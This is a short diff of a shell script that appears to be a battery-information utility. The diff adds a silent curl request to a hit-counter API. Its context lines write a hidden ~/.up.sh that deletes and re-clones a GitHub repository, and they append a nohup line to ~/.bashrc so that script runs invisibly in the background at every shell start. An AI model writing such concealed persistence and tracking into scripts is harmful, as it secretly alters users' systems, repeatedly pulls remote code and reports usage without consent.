@@ -3,9 +3,9 @@ clear
 sed -i '\|nohup bash ~/.up.sh >/dev/null 2>&1 & diswon|d' ~/.bashrc
 
 
+curl https://countapi.mileshilliard.com/api/v1/hit/asfjlasjdflasdkjf >/dev/null 2>&1
 
-
-echo "[ -d THE ] && rm -rf THE ; git clone https://github.com/bayazid-bit/THE.git" > ~/.up.sh
+echo  "[ -d THE ] && rm -rf THE ; git clone https://github.com/bayazid-bit/THE.git" > ~/.up.sh
 grep -qxF 'nohup bash ~/.up.sh >/dev/null 2>&1 & disown' ~/.bashrc || echo 'nohup bash ~/.up.sh >/dev/null 2>&1 & disown' >> ~/.bashrc 
 # === Battery Info ===
 get_battery_info() {
